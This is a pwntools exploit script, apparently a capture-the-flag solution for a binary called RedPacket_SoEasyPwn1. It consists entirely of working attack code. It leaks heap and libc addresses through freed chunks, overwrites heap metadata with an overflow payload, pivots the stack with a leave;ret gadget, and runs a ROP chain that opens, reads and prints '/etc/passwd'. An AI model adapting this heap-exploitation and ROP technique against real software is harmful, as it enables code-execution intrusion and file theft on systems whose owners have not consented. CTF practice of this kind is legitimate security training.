from pwn import *
import sys
context.log_level='debug'
debug = 1
file_name = './RedPacket_SoEasyPwn1'
libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
ip = 'node3.buuoj.cn'
prot = '25798'
if debug:
    r = process(file_name)
    libc = ELF(libc_name)
else:
    r = remote(ip,int(prot))
    libc = ELF(libc_name)

file = ELF(file_name)

sl = lambda x : r.sendline(x)
sd = lambda x : r.send(x)
sla = lambda x,y : r.sendlineafter(x,y)
rud = lambda x : r.recvuntil(x,drop=True)
ru = lambda x : r.recvuntil(x)
li = lambda name,x : log.info(name+':'+hex(x))
ri = lambda  : r.interactive()
def create(index,chunk_size,value):
    ru('Your input: ')
    sl('1')
    ru('Please input the red packet idx: ')
    sl(str(index))
    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')
    sl(str(chunk_size))
    ru('Please input content: ')
    sl(value)
def delete(index):
    ru('Your input: ')
    sl('2')
    ru('Please input the red packet idx: ')
    sl(str(index))
def show(index):
    ru('Your input: ')
    sl('4')
    ru('Please input the red packet idx: ')
    sl(str(index))
def edit(index,value):
    ru('Your input: ')
    sl('3')
    ru('Please input the red packet idx: ')
    sl(str(index))
    ru('Please input content: ')
    sl(value)
def debug():
    gdb.attach(r)
    raw_input()
# 1.0x10 2.0xf0 3.0x300 4.0x400
for x in range(8):
    create(x,4,"\x44")
    # delete(x)
create(9,1,"\x11")
for x in range(8):
    delete(x)
show(1)
data = rud("Done!")
one_heap_addr = u64(data[:6]+"\x00\x00")-0x10
target_addr = one_heap_addr-0x1010
show(7)
data = rud("Done!")
libc_base = u64(data[:6]+"\x00\x00")-0x1e4ca0
# for x in range(5):

create(0,4,"\x33")
num = [5,6,7,8,10]
for x in num:
    create(x,2,"\x22")
    delete(x)
create(0,4,"\xff")
create(0xf,3,"\x33")
delete(0)
create(1,3,"\x33")
create(0xf,3,"\x33")
create(2,4,"\x44")
create(0xf,3,"\x33")
delete(2)
create(3,3,"\x33")
create(4,4,"\x44")
create(0xf,3,"\x33")
delete(4)
# debug()
create(5,3,"\x44")
create(0xf,3,"\x33")
# debug()
payload = "a"*(0x308)+p64(0x101)+p64(one_heap_addr+0x26c0)+p64(target_addr+0x800)
edit(4,payload)
# debug()
create(0xf,2,"\xff")
debug()
payload_addr = one_heap_addr+0x4120
p_rbp = 0x00000000000253a6+libc_base
read_addr = libc.symbols['read']+libc_base
open_addr = libc.symbols['open']+libc_base
write_addr = libc.symbols['write']+libc_base
p_rdi = libc_base+0x0000000000026542
p_rsi = libc_base+0x0000000000026f9e
p_rdx = libc_base+0x000000000012bda6
payload = "/etc/passwd\x00"+"1111"+p64(p_rbp)+p64(payload_addr+0x90)+p64(p_rdi)+p64(payload_addr+0x10)+p64(p_rsi)+p64(0)+p64(p_rdx)+p64(0)+p64(open_addr)
payload += p64(p_rdi)+p64(3)+p64(p_rsi)+p64(one_heap_addr)+p64(p_rdx)+p64(0x100)+p64(read_addr)
payload += p64(p_rdi)+p64(1)+p64(p_rsi)+p64(one_heap_addr)+p64(p_rdx)+p64(0x100)+p64(write_addr)
create(0,4,payload)

ru('Your input: ')
sl("666")
ru("What do you want to say?")
li("one_heap_addr",one_heap_addr)
li("target_addr",target_addr)
li("libc_base",libc_base)
li("payload_addr",payload_addr)
leave_ret_addr = 0x000000000058373+libc_base
payload = "a"*0x80+p64(payload_addr+0x18)+p64(leave_ret_addr)
# debug()
sd(payload)
ri()